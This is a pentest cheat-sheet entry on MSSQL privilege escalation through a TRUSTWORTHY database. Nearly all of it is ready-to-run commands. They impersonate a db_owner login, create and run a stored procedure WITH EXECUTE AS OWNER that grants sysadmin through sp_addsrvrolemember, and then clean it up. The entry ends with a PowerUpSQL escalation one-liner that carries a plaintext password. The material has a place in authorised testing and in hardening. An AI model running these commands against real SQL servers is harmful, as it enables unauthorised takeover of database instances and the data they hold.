# 17.10 MSSQL Trustworthy Database Privilege Escalation

> Create a stored proc `WITH EXECUTE AS OWNER` in a TRUSTWORTHY db owned by sa to grant your login sysadmin.

## Overview

If a database is marked TRUSTWORTHY and your login can execute as a db_owner user, you can create a stored procedure that runs WITH EXECUTE AS OWNER (the database's owner, often sa) to grant sysadmin to any login. This grants domain-equivalent privilege escalation within the SQL instance.

## Steps

- Confirm the target database has is_trustworthy_on = True (from enumeration query)
- Impersonate a login that is db_owner in that database (e.g. ws_user)
- Verify db_owner status with IS_ROLEMEMBER('db_owner')
- Create a stored procedure WITH EXECUTE AS OWNER that calls sp_addsrvrolemember
- Execute sp_privesc, then drop it; revert and verify sysadmin

## Commands

### Check db_owner via impersonation

```sql
USE webshop; EXECUTE AS LOGIN = 'ws_user'; SELECT IS_ROLEMEMBER('db_owner');
```

### Create and execute privilege escalation procedure

```sql
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin' GO EXECUTE sp_privesc; DROP PROCEDURE sp_privesc;
```

### Verify sysadmin after revert

```sql
REVERT; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
```

### PowerUpSQL automated escalation

```powershell
Invoke-SQLEscalatePriv -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Verbose
```
